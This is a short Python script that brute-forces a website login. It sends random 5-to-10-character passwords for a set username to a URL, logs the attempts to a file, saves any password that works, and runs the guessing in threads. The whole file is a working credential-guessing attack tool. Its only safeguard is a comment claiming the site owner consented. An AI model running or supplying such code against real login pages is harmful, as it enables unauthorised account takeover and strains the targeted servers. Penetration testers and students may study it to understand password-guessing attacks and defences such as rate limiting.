import requests
import random
from threading import Thread
import os

# website were trying to bruteforce
#given consent by website owner
url = " "
#username were attempting to bruteforce
username = " "

def send_request(username, password):
    data = {
        "username" : username,
        "password" : password
    }
    request = requests.get(url, data=data)
    ##print(request.text)
    return request

valid_chars = "abcdefghijklmnopqrstuvwxyz123456789!@#$%^&*?/"
def brute_force():
    while True:
        if "correct_password.txt" in os.listdir():
            break
        #checks if passwd is in
        valid = False
        while not valid:
            #k is length, attempting passwords from length 5 - 10
            rndpass = random.choices(valid_chars, k=random.randint(5, 10))
            #converting list to string to pass
            passwd = "".join(rndpass)
            file = open("tries.txt", "r")
            attempts = file.read()
            file.close()
            if passwd in attempts:
                pass
            else:
                valid = True

        request = send_request(username, passwd)

        if 'failed to login' in request.text.lower():
            #append mode does not write to file
            with open("tries.txt", "a") as f:
                f.write(f"{passwd}\n")
                f.close()
            print(f"incorrect {passwd}\n")
        else:
            print(f"Correct! {passwd} was the correct password for username {username}\n")
            with open("correct_password.txt", "w") as f:
                f.write(passwd)
            break

#depending on cpu main crash
#attempts per second
for x in range(1):
    Thread(target=brute_force).start()